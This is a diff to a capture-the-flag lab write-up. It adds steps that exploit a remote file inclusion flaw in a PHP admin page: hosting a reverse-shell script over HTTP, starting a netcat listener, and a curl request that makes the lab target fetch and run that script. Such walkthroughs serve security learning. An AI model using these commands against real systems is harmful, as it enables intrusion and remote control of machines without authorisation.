@@ -115,15 +115,43 @@ Now, let's go to **searchsploit** and search if there is any vulnerability docum
 
   ```
 
-
 Now, we can work on the reverse shell:
 
 STEP 1: Generate the Reverse Shell and save it on the local host (Here, it is called RS.php)
 
 ![image](https://user-images.githubusercontent.com/99097743/170798516-8239f698-5ea1-4fb9-9d05-7ad32868babe.png)
 
+
 STEP 2: Open up an HTTP server to transfer the payload to the target machine
 
 ```sh
   sudo python3 -m http.server 80
   ```
+![image](https://user-images.githubusercontent.com/99097743/170799511-a9cb1b0c-3cb8-49e2-8aa6-af2d5cc0eff9.png)
+
+STEP 3: Turn on the listener
+```sh
+sudo nc -lvnp 87
+ ```
+ 
+ ![image](https://user-images.githubusercontent.com/99097743/170799539-6d6f535a-4de8-41f8-8860-5bfe58f86896.png)
+
+
+STEP 3: Modify the PHP Injection URL:
+
+```sh
+http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://
+  ```
+  
+STEP 4: Upload the PHP file from the localhost using the HTTP server and invoke the listener
+
+```sh
+curl  http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.123.93:80/RS.php
+  ```
+
+Niceeee!! it works:
+
+![image](https://user-images.githubusercontent.com/99097743/170799708-ca8f61e3-ba39-462a-b38d-c67ea5661769.png)
+
+
+
